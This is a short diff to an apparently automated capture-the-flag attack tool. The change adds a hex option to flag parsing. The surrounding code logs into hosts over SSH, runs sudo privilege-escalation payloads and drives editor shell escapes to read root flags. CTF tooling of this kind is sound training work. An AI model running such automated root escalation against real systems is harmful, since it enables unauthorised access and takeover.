@@ -114,7 +114,7 @@ def _candidate_users(host: HostReport) -> List[str]:
 def _grab_user_flags(host: HostReport, ip, user, pw) -> None:
     rc, out = _ssh(ip, user, pw,
                    "cat ~/user.txt ~/flag.txt /home/*/user.txt 2>/dev/null", timeout=15)
-    for tok in knowledge.find_flags(out or ""):
+    for tok in knowledge.find_flags(out or "", allow_hex=True):
         _flag(host, tok, f"{user}@{ip}:~", "USER")
 
 
@@ -230,7 +230,7 @@ def _auto_root(host, ip, user, pw, binary, args, recipe) -> bool:
             rc, out = _ssh(ip, user, pw,
                            f"echo '{pw}' | sudo -S {binary} {payload} 2>/dev/null",
                            timeout=25)
-            for tok in knowledge.find_flags(out or ""):
+            for tok in knowledge.find_flags(out or "", allow_hex=True):
                 _flag(host, tok, f"sudo {name}", "ROOT")
                 return True
     # Interactive editor/pager -> best-effort keystroke drive of its shell escape.
@@ -253,7 +253,7 @@ def _drive_editor(host, ip, user, pw, binary, args, recipe, name) -> bool:
                    + f"cat {path}\rexit\r"
         rc, out = _ssh(ip, user, pw, f"sudo {binary} {args}".rstrip(),
                        tty=True, feed=keys, timeout=25)
-        for tok in knowledge.find_flags(out or ""):
+        for tok in knowledge.find_flags(out or "", allow_hex=True):
             _flag(host, tok, f"sudo {name} (editor escape)", "ROOT")
             return True
     utils.log("warn", f"couldn't auto-drive {name} — use the printed steps "
